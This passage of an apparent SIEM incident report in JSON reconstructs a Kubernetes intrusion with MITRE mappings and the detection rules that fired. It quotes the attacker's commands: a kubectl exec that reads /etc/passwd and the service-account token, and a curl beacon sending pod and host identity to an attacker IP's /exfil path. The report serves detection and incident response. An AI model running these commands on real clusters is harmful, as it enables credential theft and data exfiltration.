  "severity": "critical",
  "network_observations": [
    {"ip": "10.108.57.184", "inferred_role": "attacker_workstation_outside_cluster_cidr", "first_seen": "2026-03-30T01:11:02+0000", "last_seen": "2026-03-30T01:21:30+0000"},
    {"ip": "10.108.57.42", "inferred_role": "kubelet_host_node", "first_seen": "2026-03-30T01:11:02+0000", "last_seen": "2026-03-30T01:14:10+0000"},
    {"ip": "10.108.57.10", "inferred_role": "kube_api_server", "first_seen": "2026-03-30T01:11:02+0000", "last_seen": "2026-03-30T01:14:10+0000"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Execution — Container Administration Command", "technique": "T1609", "what_happened": "At 2026-03-30 01:11:02 UTC, the auditd subsystem on cluster node host kube-node-01 (agent) logged execution of /usr/bin/kubectl with a command line invoking 'exec' against a production pod in namespace prod (payments-api-7f9c8-xq2lp). The kubectl process ran a shell inside the pod: /bin/bash -c 'cat /etc/passwd && id && cat /var/run/secrets/kubernetes.io/serviceaccount/token'. Wazuh fired rule 92700 'kubectl exec into running pod' with rule.mitre.id T1609. The invoking account (data.audit.uid) is NOT a CI/CD service identity and the source workstation 10.108.57.184 sits OUTSIDE the cluster pod/service CIDR — i.e. an interactive operator on an external box, not an automated pipeline.", "chain_reason": "Wazuh rule 92700 fired with rule.mitre.id=T1609 and rule.description matching 'kubectl exec into running pod'. data.audit.exe=/usr/bin/kubectl and data.audit.command contains 'exec' + the target pod name + an interactive /bin/bash invocation reading /etc/passwd and the serviceaccount token file.", "first_seen": "2026-03-30T01:11:02+0000"},
    {"step": 2, "tactic": "Command and Control — Exfiltration Beacon", "technique": "T1041", "what_happened": "At 01:11:30 UTC, ~28 seconds after the first exec, a second kubectl exec was logged by auditd on the same node, this time launching curl from inside the pod toward http://10.108.57.184/exfil?host=...&pod=payments-api-7f9c8-xq2lp. Suricata simultaneously logged outbound HTTP from the pod network range to data.dstip 10.108.57.184 on data.dstport 80. This is an outbound beacon carrying pod and host identity as URL parameters — the operator is staging data egress through the compromised pod.", "chain_reason": "A second auditd event with data.audit.exe=/usr/bin/kubectl and data.audit.command containing 'exec' + 'curl' + the attacker IP 10.108.57.184, correlated with a Suricata alert where data.dstip=10.108.57.184 and data.dstport=80 within the same 30-second window. Same node agent, same target pod.", "first_seen": "2026-03-30T01:11:30+0000"},
    {"step": 3, "tactic": "Credential Access / Collection — Kube credential dump to disk", "technique": "T1552.007", "what_happened": "At 01:12:05 UTC, Wazuh File Integrity Monitoring detected creation of a new file /tmp/kube_cfg_20260330_011102.yaml on kube-node-01. The file matches the kubeconfig structure (apiVersion: v1, kind: Config, clusters/users/contexts with an embedded bearer token). Wazuh fired rule 52103 'FIM: kube credential dump in /tmp' with rule.mitre.id T1552.007. A kubeconfig containing a cluster bearer token written to world-readable /tmp is a credential-staging artefact — the operator dumped the active cluster context to a file for collection or reuse.", "chain_reason": "Wazuh FIM rule 52103 fired with syscheck.path=/tmp/kube_cfg_20260330_011102.yaml, syscheck.event=added, and rule.mitre.id=T1552.007. The file creation timestamp (01:12:05) falls inside the same incident window as the two kubectl exec events on the same agent node.", "first_seen": "2026-03-30T01:12:05+0000"}
  ],
  "time_window": {"start": "2026-03-30T01:11:02+0000", "end": "2026-03-30T01:21:30+0000"},
  "alert_count": 3,
  "unique_steps": 3
}
